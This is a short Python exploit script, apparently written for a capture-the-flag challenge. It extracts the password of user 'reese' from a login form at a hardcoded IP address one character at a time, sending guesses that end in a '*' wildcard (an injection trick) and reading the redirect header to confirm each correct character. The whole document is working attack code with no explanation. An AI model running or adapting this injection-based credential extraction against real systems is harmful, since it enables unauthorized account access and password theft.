import requests
import string
import sys

URL = "http://94.237.122.12:44245/login"
user = "reese"
password = ""
dictionary = string.ascii_letters + string.digits + "{_}!?@#$%"

with requests.Session() as session:
    while "}" not in password:
        for char in dictionary:
            r = session.post(URL, data={"username": user, "password": password + char + "*"}, allow_redirects=False)
            sys.stdout.write(f"\rFlag: {password + char}{' ' * 20}")
            sys.stdout.flush()
            
            if  "/login" not in r.headers["Location"]:
                password += char
                break